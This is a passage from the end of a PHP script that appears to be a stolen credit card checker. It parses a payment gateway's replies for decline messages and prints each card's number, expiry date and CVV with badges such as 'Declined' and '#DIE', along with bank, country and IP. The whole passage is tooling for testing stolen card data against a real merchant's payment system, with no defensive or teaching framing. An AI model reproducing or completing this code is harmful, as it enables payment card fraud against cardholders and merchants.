  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙏𝙧𝙖𝙣𝙨𝙖𝙘𝙩𝙞𝙤𝙣 𝙉𝙤𝙩 𝘼𝙡𝙡𝙤𝙬𝙚𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3𝘿 𝙎𝙚𝙘𝙪𝙧𝙚 𝙍𝙚𝙙𝙞𝙧𝙚𝙘𝙩 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣𝙨 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩 𝘾𝙖𝙧𝙙 𝙉𝙪𝙢𝙗𝙚𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>𝙐𝙥𝙙𝙖𝙩𝙚 𝙉𝙤𝙣𝙘𝙚 ❌</i></font> <br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font> <br>";
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙖𝙧𝙙 𝙬𝙖𝙨 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙙𝙪𝙚 𝙩𝙤 𝙖𝙣 𝙐𝙣𝙠𝙣𝙤𝙬𝙣 𝙀𝙧𝙧𝙤𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

curl_close($ch);
ob_flush();
error_reporting(1);



   echo "<b>1REQ Result:</b> $result1<br><br>";
   #echo "<b>2REQ Result:</b> $result2<br><br>";
   echo "<b>Msg Result:</b> $msg<br><br>";

?>